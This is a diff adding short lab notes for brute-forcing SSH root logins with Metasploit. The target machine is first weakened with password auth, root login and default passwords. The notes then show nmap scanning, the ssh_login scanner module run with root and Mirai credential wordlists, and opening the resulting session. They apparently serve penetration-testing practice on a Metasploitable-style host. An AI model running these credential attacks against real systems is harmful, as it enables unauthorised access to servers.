@@ -1,0 +1,17 @@
+TO be done in victimpc
+passwd auth yes
+permit root login
+set passwd as admin or 12345 or default or password
+nmap 10.100.150.130
+use auxiliary/scanner/ssh/ssh_login
+show options
+set THREADS 3
+set RHOST 10.100.219.187
+set STOP_ON_SUCCESS true
+set USERNAME root
+set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+set USERPASS_FILE /usr/share/wordlists/metasploit/mirai_user_pass.txt
+run
+sessions 2
+ref doc
+https://charlesreid1.com/wiki/Metasploitable/SSH/Exploits
